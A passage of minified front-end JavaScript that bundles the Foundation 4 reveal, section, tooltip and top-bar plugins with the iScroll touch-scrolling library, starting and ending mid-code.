n.animate(i,this.settings.animationSpeed,"linear",function(){this.locked=!1,n.css(r).trigger("closed")}.bind(this)).removeClass("open")}.bind(this),this.settings.animationSpeed/2)}if(/fade/i.test(this.settings.animation)){var i={opacity:0};return this.delay(function(){return n.animate(i,this.settings.animationSpeed,"linear",function(){this.locked=!1,n.css(r).trigger("closed")}.bind(this)).removeClass("open")}.bind(this),this.settings.animationSpeed/2)}return n.hide().css(r).removeClass("open").trigger("closed")}return/fade/i.test(this.settings.animation)?n.fadeOut(this.settings.animationSpeed/2):n.hide()},close_video:function(t){var n=e(this).find(".flex-video"),r=n.find("iframe");r.length>0&&(r.attr("data-src",r[0].src),r.attr("src","about:blank"),n.fadeOut(100).hide())},open_video:function(t){var n=e(this).find(".flex-video"),r=n.find("iframe");if(r.length>0){var i=r.attr("data-src");typeof i=="string"&&(r[0].src=r.attr("data-src")),n.show().fadeIn(100)}},cache_offset:function(e){var t=e.show().height()+parseInt(e.css("top"),10);return e.hide(),t},off:function(){e(this.scope).off(".fndtn.reveal")}}}(Foundation.zj,this,this.document),function(e,t,n,r){"use strict";Foundation.libs.section={name:"section",version:"4.1.1",settings:{deep_linking:!1,one_up:!0,callback:function(){}},init:function(e,t,n){var r=this;return Foundation.inherit(this,"throttle data_options position_right offset_right"),typeof t!="string"?(this.set_active_from_hash(),this.events(),!0):this[t].call(this,n)},events:function(){var r=this;e(this.scope).on("click.fndtn.section","[data-section] .title",function(t){var n=e(this),i=n.closest("[data-section]");r.toggle_active.call(this,t,r)}),e(t).on("resize.fndtn.section",r.throttle(function(){r.resize.call(this)},30)).on("hashchange",function(){r.settings.toggled||(r.set_active_from_hash(),e(this).trigger("resize"))}).trigger("resize"),e(n).on("click.fndtn.section",function(t){e(t.target).closest(".title").length<1&&e('[data-section="vertical-nav"], [data-section="horizontal-nav"]').find("section, .section").removeClass("active").attr("style","")})},toggle_active:function(t,n){var r=e(this),i=r.closest("section, .section"),s=i.find(".content"),o=i.closest("[data-section]"),n=Foundation.libs.section,u=e.extend({},n.settings,n.data_options(o));n.settings.toggled=!0,!u.deep_linking&&s.length>0&&t.preventDefault();if(i.hasClass("active"))(n.small(o)||n.is_vertical(o)||n.is_horizontal(o)||n.is_accordion(o))&&i.removeClass("active").attr("style","");else{var a=null,f=n.outerHeight(i.find(".title"));if(n.small(o)||u.one_up)a=r.closest("[data-section]").find("section.active, .section.active"),n.small(o)?a.attr("style",""):a.attr("style","visibility: hidden; padding-top: "+f+"px;");n.small(o)?i.attr("style",""):i.css("padding-top",f),i.addClass("active"),a!==null&&a.removeClass("active").attr("style","")}setTimeout(function(){n.settings.toggled=!1},300),u.callback()},resize:function(){var t=e("[data-section]"),n=Foundation.libs.section;t.each(function(){var t=e(this),r=t.find("section.active, .section.active"),i=e.extend({},n.settings,n.data_options(t));if(r.length>1)r.not(":first").removeClass("active").attr("style","");else if(r.length<1&&!n.is_vertical(t)&&!n.is_horizontal(t)&&!n.is_accordion(t)){var s=t.find("section, .section").first();s.addClass("active"),n.small(t)?s.attr("style",""):s.css("padding-top",n.outerHeight(s.find(".title")))}n.small(t)?r.attr("style",""):r.css("padding-top",n.outerHeight(r.find(".title"))),n.position_titles(t),n.is_horizontal(t)&&!n.small(t)?n.position_content(t):n.position_content(t,!1)})},is_vertical:function(e){return/vertical-nav/i.test(e.data("section"))},is_horizontal:function(e){return/horizontal-nav/i.test(e.data("section"))},is_accordion:function(e){return/accordion/i.test(e.data("section"))},is_tabs:function(e){return/tabs/i.test(e.data("section"))},set_active_from_hash:function(){var n=t.location.hash.substring(1),r=e("[data-section]"),i=this;r.each(function(){var t=e(this),r=e.extend({},i.settings,i.data_options(t));n.length>0&&r.deep_linking&&(t.find("section, .section").attr("style","").removeClass("active"),t.find('.content[data-slug="'+n+'"]').closest("section, .section").addClass("active"))})},position_titles:function(t,n){var r=t.find(".title"),i=0,s=this;typeof n=="boolean"?r.attr("style",""):r.each(function(){s.rtl?e(this).css("right",i):e(this).css("left",i),i+=s.outerWidth(e(this))})},position_content:function(t,n){var r=t.find(".title"),i=t.find(".content"),s=this;typeof n=="boolean"?(i.attr("style",""),t.attr("style","")):(t.find("section, .section").each(function(){var t=e(this).find(".title"),n=e(this).find(".content");s.rtl?n.css({right:s.position_right(t)+1,top:s.outerHeight(t)-2}):n.css({left:t.position().left-1,top:s.outerHeight(t)-2})}),typeof Zepto=="function"?t.height(this.outerHeight(r.first())):t.height(this.outerHeight(r.first())-2))},position_right:function(e){var t=e.closest("[data-section]"),n=e.closest("[data-section]").width(),r=t.find(".title").length;return n-e.position().left-e.width()*(e.index()+1)-r},reflow:function(){e("[data-section]").trigger("resize")},small:function(t){var n=e.extend({},this.settings,this.data_options(t));return this.is_tabs(t)?!1:t&&this.is_accordion(t)?!0:e("html").hasClass("lt-ie9")?!0:e("html").hasClass("ie8compat")?!0:e(this.scope).width()<768},off:function(){e(this.scope).off(".fndtn.section"),e(t).off(".fndtn.section"),e(n).off(".fndtn.section")}}}(Foundation.zj,this,this.document),function(e,t,n,r){"use strict";Foundation.libs.tooltips={name:"tooltips",version:"4.1.0",settings:{selector:".has-tip",additionalInheritableClasses:[],tooltipClass:".tooltip",tipTemplate:function(e,t){return'<span data-selector="'+e+'" class="'+Foundation.libs.tooltips.settings.tooltipClass.substring(1)+'">'+t+'<span class="nub"></span></span>'}},cache:{},init:function(t,n,r){var i=this;this.scope=t||this.scope,typeof n=="object"&&e.extend(!0,this.settings,n);if(typeof n=="string")return this[n].call(this,r);Modernizr.touch?e(this.scope).on("click.fndtn.tooltip touchstart.fndtn.tooltip touchend.fndtn.tooltip","[data-tooltip]",function(t){t.preventDefault(),e(i.settings.tooltipClass).hide(),i.showOrCreateTip(e(this))}).on("click.fndtn.tooltip touchstart.fndtn.tooltip touchend.fndtn.tooltip",this.settings.tooltipClass,function(t){t.preventDefault(),e(this).fadeOut(150)}):e(this.scope).on("mouseenter.fndtn.tooltip mouseleave.fndtn.tooltip","[data-tooltip]",function(t){var n=e(this);t.type==="mouseover"||t.type==="mouseenter"?i.showOrCreateTip(n):(t.type==="mouseout"||t.type==="mouseleave")&&i.hide(n)})},showOrCreateTip:function(e){var t=this.getTip(e);return t&&t.length>0?this.show(e):this.create(e)},getTip:function(t){var n=this.selector(t),r=null;return n&&(r=e("span[data-selector="+n+"]"+this.settings.tooltipClass)),typeof r=="object"?r:!1},selector:function(e){var t=e.attr("id"),n=e.attr("data-tooltip")||e.attr("data-selector");return(t&&t.length<1||!t)&&typeof n!="string"&&(n="tooltip"+Math.random().toString(36).substring(7),e.attr("data-selector",n)),t&&t.length>0?t:n},create:function(t){var n=e(this.settings.tipTemplate(this.selector(t),e("<div>").html(t.attr("title")).html())),r=this.inheritable_classes(t);n.addClass(r).appendTo("body"),Modernizr.touch&&n.append('<span class="tap-to-close">tap to close </span>'),t.removeAttr("title").attr("title",""),this.show(t)},reposition:function(n,r,i){var s,o,u,a,f,l;r.css("visibility","hidden").show(),s=n.data("width"),o=r.children(".nub"),u=this.outerHeight(o),a=this.outerHeight(o),l=function(e,t,n,r,i,s){return e.css({top:t?t:"auto",bottom:r?r:"auto",left:i?i:"auto",right:n?n:"auto",width:s?s:"auto"}).end()},l(r,n.offset().top+this.outerHeight(n)+10,"auto","auto",n.offset().left,s);if(e(t).width()<767)l(r,n.offset().top+this.outerHeight(n)+10,"auto","auto",12.5,e(this.scope).width()),r.addClass("tip-override"),l(o,-u,"auto","auto",n.offset().left);else{var c=n.offset().left;Foundation.rtl&&(c=n.offset().left+n.offset().width-this.outerWidth(r)),l(r,n.offset().top+this.outerHeight(n)+10,"auto","auto",c,s),r.removeClass("tip-override"),i&&i.indexOf("tip-top")>-1?l(r,n.offset().top-this.outerHeight(r),"auto","auto",c,s).removeClass("tip-override"):i&&i.indexOf("tip-left")>-1?l(r,n.offset().top+this.outerHeight(n)/2-u*2.5,"auto","auto",n.offset().left-this.outerWidth(r)-u,s).removeClass("tip-override"):i&&i.indexOf("tip-right")>-1&&l(r,n.offset().top+this.outerHeight(n)/2-u*2.5,"auto","auto",n.offset().left+this.outerWidth(n)+u,s).removeClass("tip-override")}r.css("visibility","visible").hide()},inheritable_classes:function(t){var n=["tip-top","tip-left","tip-bottom","tip-right","noradius"].concat(this.settings.additionalInheritableClasses),r=t.attr("class"),i=r?e.map(r.split(" "),function(t,r){if(e.inArray(t,n)!==-1)return t}).join(" "):"";return e.trim(i)},show:function(e){var t=this.getTip(e);this.reposition(e,t,e.attr("class")),t.fadeIn(150)},hide:function(e){var t=this.getTip(e);t.fadeOut(150)},reload:function(){var t=e(this);return t.data("fndtn-tooltips")?t.foundationTooltips("destroy").foundationTooltips("init"):t.foundationTooltips("init")},off:function(){e(this.scope).off(".fndtn.tooltip"),e(this.settings.tooltipClass).each(function(t){e("[data-tooltip]").get(t).attr("title",e(this).text())}).remove()}}}(Foundation.zj,this,this.document),function(e,t,n,r){"use strict";Foundation.libs.topbar={name:"topbar",version:"4.1.0",settings:{index:0,stickyClass:"sticky",custom_back_text:!0,back_text:"Back",init:!1},init:function(n,r){var i=this;return typeof n=="object"&&e.extend(!0,this.settings,n),typeof n!="string"?(e(".top-bar").each(function(){i.settings.$w=e(t),i.settings.$topbar=e(this),i.settings.$section=i.settings.$topbar.find("section"),i.settings.$titlebar=i.settings.$topbar.children("ul").first(),i.settings.$topbar.data("index",0);var n=e("<div class='top-bar-js-breakpoint'/>").insertAfter(i.settings.$topbar);i.settings.breakPoint=n.width(),n.remove(),i.assemble(),i.settings.$topbar.parent().hasClass("fixed")&&e("body").css("padding-top",i.outerHeight(i.settings.$topbar))}),i.settings.init||this.events(),this.settings.init):this[n].call(this,r)},events:function(){var n=this,r=this.outerHeight(e(".top-bar"));e(this.scope).on("click.fndtn.topbar",".top-bar .toggle-topbar",function(i){var s=e(this).closest(".top-bar"),o=s.find("section, .section"),u=s.children("ul").first();s.data("height")||n.largestUL(),i.preventDefault(),n.breakpoint()&&s.toggleClass("expanded").css("min-height",""),s.hasClass("expanded")||(n.rtl?(o.css({right:"0%"}),o.find(">.name").css({right:"100%"})):(o.css({left:"0%"}),o.find(">.name").css({left:"100%"})),o.find("li.moved").removeClass("moved"),s.data("index",0)),s.parent().hasClass("fixed")?(s.parent().removeClass("fixed"),e("body").css("padding-top","0"),t.scrollTo(0,0)):s.hasClass("fixed expanded")&&(s.parent().addClass("fixed"),e("body").css("padding-top",r))}).on("click.fndtn.topbar",".top-bar .has-dropdown>a",function(t){var r=e(this).closest(".top-bar"),i=r.find("section, .section"),s=r.children("ul").first();(Modernizr.touch||n.breakpoint())&&t.preventDefault();if(n.breakpoint()){var o=e(this),u=o.closest("li");r.data("index",r.data("index")+1),u.addClass("moved"),n.rtl?(i.css({right:-(100*r.data("index"))+"%"}),i.find(">.name").css({right:100*r.data("index")+"%"})):(i.css({left:-(100*r.data("index"))+"%"}),i.find(">.name").css({left:100*r.data("index")+"%"})),o.siblings("ul").height(r.data("height")+n.outerHeight(s,!0)),r.css("min-height",r.data("height")+n.outerHeight(s,!0)*2)}}),e(t).on("resize.fndtn.topbar",function(){n.breakpoint()||e(".top-bar").css("min-height","").removeClass("expanded")}.bind(this)),e(this.scope).on("click.fndtn",".top-bar .has-dropdown .back",function(t){t.preventDefault();var r=e(this),i=r.closest(".top-bar"),s=i.find("section, .section"),o=r.closest("li.moved"),u=o.parent();i.data("index",i.data("index")-1),n.rtl?(s.css({right:-(100*i.data("index"))+"%"}),s.find(">.name").css({right:100*i.data("index")+"%"})):(s.css({left:-(100*i.data("index"))+"%"}),s.find(">.name").css({left:100*i.data("index")+"%"})),i.data("index")===0&&i.css("min-height",0),setTimeout(function(){o.removeClass("moved")},300)})},breakpoint:function(){return e(t).width()<=this.settings.breakPoint||e("html").hasClass("lt-ie9")},assemble:function(){var t=this;this.settings.$section.detach(),this.settings.$section.find(".has-dropdown>a").each(function(){var n=e(this),r=n.siblings(".dropdown"),i=e('<li class="title back js-generated"><h5><a href="#"></a></h5></li>');t.settings.custom_back_text==1?i.find("h5>a").html("&laquo; "+t.settings.back_text):i.find("h5>a").html("&laquo; "+n.html()),r.prepend(i)}),this.settings.$section.appendTo(this.settings.$topbar),this.sticky()},largestUL:function(){var t=this.settings.$topbar.find("section ul ul"),n=t.first(),r=0,i=this;t.each(function(){e(this).children("li").length>n.children("li").length&&(n=e(this))}),n.children("li").each(function(){r+=i.outerHeight(e(this),!0)}),this.settings.$topbar.data("height",r)},sticky:function(){var n="."+this.settings.stickyClass;if(e(n).length>0){var r=e(n).length?e(n).offset().top:0,i=e(t),s=this.outerHeight(e(".top-bar"));i.scroll(function(){i.scrollTop()>=r?(e(n).addClass("fixed"),e("body").css("padding-top",s)):i.scrollTop()<r&&(e(n).removeClass("fixed"),e("body").css("padding-top","0"))})}},off:function(){e(this.scope).off(".fndtn.topbar"),e(t).off(".fndtn.topbar")}}}(Foundation.zj,this,this.document);
// js/vendor/iscroll.js

(function(window,doc){var m=Math,dummyStyle=doc.createElement('div').style,vendor=(function(){var vendors='t,webkitT,MozT,msT,OT'.split(','),t,i=0,l=vendors.length;for(;i<l;i++){t=vendors[i]+'ransform';if(t in dummyStyle){return vendors[i].substr(0,vendors[i].length-1);}}
return false;})(),cssVendor=vendor?'-'+vendor.toLowerCase()+'-':'',transform=prefixStyle('transform'),transitionProperty=prefixStyle('transitionProperty'),transitionDuration=prefixStyle('transitionDuration'),transformOrigin=prefixStyle('transformOrigin'),transitionTimingFunction=prefixStyle('transitionTimingFunction'),transitionDelay=prefixStyle('transitionDelay'),isAndroid=(/android/gi).test(navigator.appVersion),isIDevice=(/iphone|ipad/gi).test(navigator.appVersion),isTouchPad=(/hp-tablet/gi).test(navigator.appVersion),has3d=prefixStyle('perspective')in dummyStyle,hasTouch='ontouchstart'in window&&!isTouchPad,hasTransform=vendor!==false,hasTransitionEnd=prefixStyle('transition')in dummyStyle,RESIZE_EV='onorientationchange'in window?'orientationchange':'resize',START_EV=hasTouch?'touchstart':'mousedown',MOVE_EV=hasTouch?'touchmove':'mousemove',END_EV=hasTouch?'touchend':'mouseup',CANCEL_EV=hasTouch?'touchcancel':'mouseup',TRNEND_EV=(function(){if(vendor===false)return false;var transitionEnd={'':'transitionend','webkit':'webkitTransitionEnd','Moz':'transitionend','O':'otransitionend','ms':'MSTransitionEnd'};return transitionEnd[vendor];})(),nextFrame=(function(){return window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(callback){return setTimeout(callback,1);};})(),cancelFrame=(function(){return window.cancelRequestAnimationFrame||window.webkitCancelAnimationFrame||window.webkitCancelRequestAnimationFrame||window.mozCancelRequestAnimationFrame||window.oCancelRequestAnimationFrame||window.msCancelRequestAnimationFrame||clearTimeout;})(),translateZ=has3d?' translateZ(0)':'',iScroll=function(el,options){var that=this,i;that.wrapper=typeof el=='object'?el:doc.getElementById(el);that.wrapper.style.overflow='hidden';that.scroller=that.wrapper.children[0];that.options={hScroll:true,vScroll:true,x:0,y:0,bounce:true,bounceLock:false,momentum:true,lockDirection:true,useTransform:true,useTransition:false,topOffset:0,checkDOMChanges:false,handleClick:true,hScrollbar:true,vScrollbar:true,fixedScrollbar:isAndroid,hideScrollbar:isIDevice,fadeScrollbar:isIDevice&&has3d,scrollbarClass:'',zoom:false,zoomMin:1,zoomMax:4,doubleTapZoom:2,wheelAction:'scroll',snap:false,snapThreshold:1,onRefresh:null,onBeforeScrollStart:function(e){e.preventDefault();},onScrollStart:null,onBeforeScrollMove:null,onScrollMove:null,onBeforeScrollEnd:null,onScrollEnd:null,onTouchEnd:null,onDestroy:null,onZoomStart:null,onZoom:null,onZoomEnd:null};for(i in options)that.options[i]=options[i];that.x=that.options.x;that.y=that.options.y;that.options.useTransform=hasTransform&&that.options.useTransform;that.options.hScrollbar=that.options.hScroll&&that.options.hScrollbar;that.options.vScrollbar=that.options.vScroll&&that.options.vScrollbar;that.options.zoom=that.options.useTransform&&that.options.zoom;that.options.useTransition=hasTransitionEnd&&that.options.useTransition;if(that.options.zoom&&isAndroid){translateZ='';}
that.scroller.style[transitionProperty]=that.options.useTransform?cssVendor+'transform':'top left';that.scroller.style[transitionDuration]='0';that.scroller.style[transformOrigin]='0 0';if(that.options.useTransition)that.scroller.style[transitionTimingFunction]='cubic-bezier(0.33,0.66,0.66,1)';if(that.options.useTransform)that.scroller.style[transform]='translate('+that.x+'px,'+that.y+'px)'+translateZ;else that.scroller.style.cssText+=';position:absolute;top:'+that.y+'px;left:'+that.x+'px';if(that.options.useTransition)that.options.fixedScrollbar=true;that.refresh();that._bind(RESIZE_EV,window);that._bind(START_EV);if(!hasTouch){if(that.options.wheelAction!='none'){that._bind('DOMMouseScroll');that._bind('mousewheel');}}
if(that.options.checkDOMChanges)that.checkDOMTime=setInterval(function(){that._checkDOMChanges();},500);};iScroll.prototype={enabled:true,x:0,y:0,steps:[],scale:1,currPageX:0,currPageY:0,pagesX:[],pagesY:[],aniTime:null,wheelZoomCount:0,handleEvent:function(e){var that=this;switch(e.type){case START_EV:if(!hasTouch&&e.button!==0)return;that._start(e);break;case MOVE_EV:that._move(e);break;case END_EV:case CANCEL_EV:that._end(e);break;case RESIZE_EV:that._resize();break;case'DOMMouseScroll':case'mousewheel':that._wheel(e);break;case TRNEND_EV:that._transitionEnd(e);break;}},_checkDOMChanges:function(){if(this.moved||this.zoomed||this.animating||(this.scrollerW==this.scroller.offsetWidth*this.scale&&this.scrollerH==this.scroller.offsetHeight*this.scale))return;this.refresh();},_scrollbar:function(dir){var that=this,bar;if(!that[dir+'Scrollbar']){if(that[dir+'ScrollbarWrapper']){if(hasTransform)that[dir+'ScrollbarIndicator'].style[transform]='';that[dir+'ScrollbarWrapper'].parentNode.removeChild(that[dir+'ScrollbarWrapper']);that[dir+'ScrollbarWrapper']=null;that[dir+'ScrollbarIndicator']=null;}
return;}
if(!that[dir+'ScrollbarWrapper']){bar=doc.createElement('div');if(that.options.scrollbarClass)bar.className=that.options.scrollbarClass+dir.toUpperCase();else bar.style.cssText='position:absolute;z-index:100;'+(dir=='h'?'height:7px;bottom:1px;left:2px;right:'+(that.vScrollbar?'7':'2')+'px':'width:7px;bottom:'+(that.hScrollbar?'7':'2')+'px;top:2px;right:1px');bar.style.cssText+=';pointer-events:none;'+cssVendor+'transition-property:opacity;'+cssVendor+'transition-duration:'+(that.options.fadeScrollbar?'350ms':'0')+';overflow:hidden;opacity:'+(that.options.hideScrollbar?'0':'1');that.wrapper.appendChild(bar);that[dir+'ScrollbarWrapper']=bar;bar=doc.createElement('div');if(!that.options.scrollbarClass){bar.style.cssText='position:absolute;z-index:100;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.9);'+cssVendor+'background-clip:padding-box;'+cssVendor+'box-sizing:border-box;'+(dir=='h'?'height:100%':'width:100%')+';'+cssVendor+'border-radius:3px;border-radius:3px';}
bar.style.cssText+=';pointer-events:none;'+cssVendor+'transition-property:'+cssVendor+'transform;'+cssVendor+'transition-timing-function:cubic-bezier(0.33,0.66,0.66,1);'+cssVendor+'transition-duration:0;'+cssVendor+'transform: translate(0,0)'+translateZ;if(that.options.useTransition)bar.style.cssText+=';'+cssVendor+'transition-timing-function:cubic-bezier(0.33,0.66,0.66,1)';that[dir+'ScrollbarWrapper'].appendChild(bar);that[dir+'ScrollbarIndicator']=bar;}
if(dir=='h'){that.hScrollbarSize=that.hScrollbarWrapper.clientWidth;that.hScrollbarIndicatorSize=m.max(m.round(that.hScrollbarSize*that.hScrollbarSize/that.scrollerW),8);that.hScrollbarIndicator.style.width=that.hScrollbarIndicatorSize+'px';that.hScrollbarMaxScroll=that.hScrollbarSize-that.hScrollbarIndicatorSize;that.hScrollbarProp=that.hScrollbarMaxScroll/that.maxScrollX;}else{that.vScrollbarSize=that.vScrollbarWrapper.clientHeight;that.vScrollbarIndicatorSize=m.max(m.round(that.vScrollbarSize*that.vScrollbarSize/that.scrollerH),8);that.vScrollbarIndicator.style.height=that.vScrollbarIndicatorSize+'px';that.vScrollbarMaxScroll=that.vScrollbarSize-that.vScrollbarIndicatorSize;that.vScrollbarProp=that.vScrollbarMaxScroll/that.maxScrollY;}
that._scrollbarPos(dir,true);},_resize:function(){var that=this;setTimeout(function(){that.refresh();},isAndroid?200:0);},_pos:function(x,y){if(this.zoomed)return;x=this.hScroll?x:0;y=this.vScroll?y:0;if(this.options.useTransform){this.scroller.style[transform]='translate('+x+'px,'+y+'px) scale('+this.scale+')'+translateZ;}else{x=m.round(x);y=m.round(y);this.scroller.style.left=x+'px';this.scroller.style.top=y+'px';}
this.x=x;this.y=y;this._scrollbarPos('h');this._scrollbarPos('v');},_scrollbarPos:function(dir,hidden){var that=this,pos=dir=='h'?that.x:that.y,size;if(!that[dir+'Scrollbar'])return;pos=that[dir+'ScrollbarProp']*pos;if(pos<0){if(!that.options.fixedScrollbar){size=that[dir+'ScrollbarIndicatorSize']+m.round(pos*3);if(size<8)size=8;that[dir+'ScrollbarIndicator'].style[dir=='h'?'width':'height']=size+'px';}
pos=0;}else if(pos>that[dir+'ScrollbarMaxScroll']){if(!that.options.fixedScrollbar){size=that[dir+'ScrollbarIndicatorSize']-m.round((pos-that[dir+'ScrollbarMaxScroll'])*3);if(size<8)size=8;that[dir+'ScrollbarIndicator'].style[dir=='h'?'width':'height']=size+'px';pos=that[dir+'ScrollbarMaxScroll']+(that[dir+'ScrollbarIndicatorSize']-size);}else{pos=that[dir+'ScrollbarMaxScroll'];}}
that[dir+'ScrollbarWrapper'].style[transitionDelay]='0';that[dir+'ScrollbarWrapper'].style.opacity=hidden&&that.options.hideScrollbar?'0':'1';that[dir+'ScrollbarIndicator'].style[transform]='translate('+(dir=='h'?pos+'px,0)':'0,'+pos+'px)')+translateZ;},_start:function(e){var that=this,point=hasTouch?e.touches[0]:e,matrix,x,y,c1,c2,tagName=e.target.nodeName.toLowerCase();if(that.focusedInput){that.focusedInput.blur();that.focusedInput=false;}
if(tagName==="select"||tagName==="input"||tagName==="textarea"){e.target.focus();that.focusedInput=e.target;return false;}
if(!that.enabled)return;if(that.options.onBeforeScrollStart)that.options.onBeforeScrollStart.call(that,e);if(that.options.useTransition||that.options.zoom)that._transitionTime(0);that.moved=false;that.animating=false;that.zoomed=false;that.distX=0;that.distY=0;that.absDistX=0;that.absDistY=0;that.dirX=0;that.dirY=0;if(that.options.zoom&&hasTouch&&e.touches.length>1){c1=m.abs(e.touches[0].pageX-e.touches[1].pageX);c2=m.abs(e.touches[0].pageY-e.touches[1].pageY);that.touchesDistStart=m.sqrt(c1*c1+c2*c2);that.originX=m.abs(e.touches[0].pageX+e.touches[1].pageX-that.wrapperOffsetLeft*2)/2-that.x;that.originY=m.abs(e.touches[0].pageY+e.touches[1].pageY-that.wrapperOffsetTop*2)/2-that.y;if(that.options.onZoomStart)that.options.onZoomStart.call(that,e);}
if(that.options.momentum){if(that.options.useTransform){matrix=getComputedStyle(that.scroller,null)[transform].replace(/[^0-9\-.,]/g,'').split(',');x=+(matrix[12]||matrix[4]);y=+(matrix[13]||matrix[5]);}else{x=+getComputedStyle(that.scroller,null).left.replace(/[^0-9-]/g,'');y=+getComputedStyle(that.scroller,null).top.replace(/[^0-9-]/g,'');}
if(x!=that.x||y!=that.y){if(that.options.useTransition)that._unbind(TRNEND_EV);else cancelFrame(that.aniTime);that.steps=[];that._pos(x,y);if(that.options.onScrollEnd)that.options.onScrollEnd.call(that);}}
that.absStartX=that.x;that.absStartY=that.y;that.startX=that.x;that.startY=that.y;that.pointX=point.pageX;that.pointY=point.pageY;that.startTime=e.timeStamp||Date.now();if(that.options.onScrollStart)that.options.onScrollStart.call(that,e);that._bind(MOVE_EV,window);that._bind(END_EV,window);that._bind(CANCEL_EV,window);},_move:function(e){var that=this,point=hasTouch?e.touches[0]:e,deltaX=point.pageX-that.pointX,deltaY=point.pageY-that.pointY,newX=that.x+deltaX,newY=that.y+deltaY,c1,c2,scale,timestamp=e.timeStamp||Date.now();if(that.options.onBeforeScrollMove)that.options.onBeforeScrollMove.call(that,e);if(that.options.zoom&&hasTouch&&e.touches.length>1){c1=m.abs(e.touches[0].pageX-e.touches[1].pageX);c2=m.abs(e.touches[0].pageY-e.touches[1].pageY);that.touchesDist=m.sqrt(c1*c1+c2*c2);that.zoomed=true;scale=1/that.touchesDistStart*that.touchesDist*this.scale;if(scale<that.options.zoomMin)scale=0.5*that.options.zoomMin*Math.pow(2.0,scale/that.options.zoomMin);else if(scale>that.options.zoomMax)scale=2.0*that.options.zoomMax*Math.pow(0.5,that.options.zoomMax/scale);that.lastScale=scale/this.scale;newX=this.originX-this.originX*that.lastScale+this.x;newY=this.originY-this.originY*that.lastScale+this.y;this.scroller.style[transform]='translate('+newX+'px,'+newY+'px) scale('+scale+')'+translateZ;if(that.options.onZoom)that.options.onZoom.call(that,e);return;}
that.pointX=point.pageX;that.pointY=point.pageY;if(newX>0||newX<that.maxScrollX){newX=that.options.bounce?that.x+(deltaX/2):newX>=0||that.maxScrollX>=0?0:that.maxScrollX;}
if(newY>that.minScrollY||newY<that.maxScrollY){newY=that.options.bounce?that.y+(deltaY/2):newY>=that.minScrollY||that.maxScrollY>=0?that.minScrollY:that.maxScrollY;}
that.distX+=deltaX;that.distY+=deltaY;that.absDistX=m.abs(that.distX);that.absDistY=m.abs(that.distY);if(that.absDistX<6&&that.absDistY<6){return;}
if(that.options.lockDirection){if(that.absDistX>that.absDistY+5){newY=that.y;deltaY=0;}else if(that.absDistY>that.absDistX+5){newX=that.x;deltaX=0;}}
that.moved=true;that._pos(newX,newY);that.dirX=deltaX>0?-1:deltaX<0?1:0;that.dirY=deltaY>0?-1:deltaY<0?1:0;if(timestamp-that.startTime>300){that.startTime=timestamp;that.startX=that.x;that.startY=that.y;}
if(that.options.onScrollMove)that.options.onScrollMove.call(that,e);},_end:function(e){if(hasTouch&&e.touches.length!==0)return;var that=this,point=hasTouch?e.changedTouches[0]:e,target,ev,momentumX={dist:0,time:0},momentumY={dist:0,time:0},duration=(e.timeStamp||Date.now())-that.startTime,newPosX=that.x,newPosY=that.y,distX,distY,newDuration,snap,scale;that._unbind(MOVE_EV,window);that._unbind(END_EV,window);that._unbind(CANCEL_EV,window);if(that.options.onBeforeScrollEnd)that.options.onBeforeScrollEnd.call(that,e);if(that.zoomed){scale=that.scale*that.lastScale;scale=Math.max(that.options.zoomMin,scale);scale=Math.min(that.options.zoomMax,scale);that.lastScale=scale/that.scale;that.scale=scale;that.x=that.originX-that.originX*that.lastScale+that.x;that.y=that.originY-that.originY*that.lastScale+that.y;that.scroller.style[transitionDuration]='200ms';that.scroller.style[transform]='translate('+that.x+'px,'+that.y+'px) scale('+that.scale+')'+translateZ;that.zoomed=false;that.refresh();if(that.options.onZoomEnd)that.options.onZoomEnd.call(that,e);return;}
if(!that.moved){if(hasTouch){if(that.doubleTapTimer&&that.options.zoom){clearTimeout(that.doubleTapTimer);that.doubleTapTimer=null;if(that.options.onZoomStart)that.options.onZoomStart.call(that,e);that.zoom(that.pointX,that.pointY,that.scale==1?that.options.doubleTapZoom:1);if(that.options.onZoomEnd){setTimeout(function(){that.options.onZoomEnd.call(that,e);},200);}}else if(this.options.handleClick){that.doubleTapTimer=setTimeout(function(){that.doubleTapTimer=null;target=point.target;while(target.nodeType!=1)target=target.parentNode;if(target.tagName!='SELECT'&&target.tagName!='INPUT'&&target.tagName!='TEXTAREA'){ev=doc.createEvent('MouseEvents');ev.initMouseEvent('click',true,true,e.view,1,point.screenX,point.screenY,point.clientX,point.clientY,e.ctrlKey,e.altKey,e.shiftKey,e.metaKey,0,null);ev._fake=true;target.dispatchEvent(ev);}},that.options.zoom?250:0);}}
that._resetPos(400);if(that.options.onTouchEnd)that.options.onTouchEnd.call(that,e);return;}
if(duration<300&&that.options.momentum){momentumX=newPosX?that._momentum(newPosX-that.startX,duration,-that.x,that.scrollerW-that.wrapperW+that.x,that.options.bounce?that.wrapperW:0):momentumX;momentumY=newPosY?that._momentum(newPosY-that.startY,duration,-that.y,(that.maxScrollY<0?that.scrollerH-that.wrapperH+that.y-that.minScrollY:0),that.options.bounce?that.wrapperH:0):momentumY;newPosX=that.x+momentumX.dist;newPosY=that.y+momentumY.dist;if((that.x>0&&newPosX>0)||(that.x<that.maxScrollX&&newPosX<that.maxScrollX))momentumX={dist:0,time:0};if((that.y>that.minScrollY&&newPosY>that.minScrollY)||(that.y<that.maxScrollY&&newPosY<that.maxScrollY))momentumY={dist:0,time:0};}
if(momentumX.dist||momentumY.dist){newDuration=m.max(m.max(momentumX.time,momentumY.time),10);if(that.options.snap){distX=newPosX-that.absStartX;distY=newPosY-that.absStartY;if(m.abs(distX)<that.options.snapThreshold&&m.abs(distY)<that.options.snapThreshold){that.scrollTo(that.absStartX,that.absStartY,200);}
else{snap=that._snap(newPosX,newPosY);newPosX=snap.x;newPosY=snap.y;newDuration=m.max(snap.time,newDuration);}}
that.scrollTo(m.round(newPosX),m.round(newPosY),newDuration);if(that.options.onTouchEnd)that.options.onTouchEnd.call(that,e);return;}
if(that.options.snap){distX=newPosX-that.absStartX;distY=newPosY-that.absStartY;if(m.abs(distX)<that.options.snapThreshold&&m.abs(distY)<that.options.snapThreshold)that.scrollTo(that.absStartX,that.absStartY,200);else{snap=that._snap(that.x,that.y);if(snap.x!=that.x||snap.y!=that.y)that.scrollTo(snap.x,snap.y,snap.time);}
if(that.options.onTouchEnd)that.options.onTouchEnd.call(that,e);return;}
